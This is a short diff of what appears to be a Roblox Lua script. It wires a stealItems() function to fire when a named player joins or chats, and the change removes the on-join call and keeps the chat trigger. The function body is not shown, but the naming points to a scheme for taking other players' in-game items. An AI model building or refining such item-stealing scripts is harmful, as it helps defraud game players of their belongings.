@@ -380,10 +380,6 @@ end
 
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == Username then
-        -- Call the stealItems function immediately when the player is detected
-        stealItems()
-        
-        -- Set up the Chatted event
         player.Chatted:Connect(function(msg)
             stealItems()
         end)
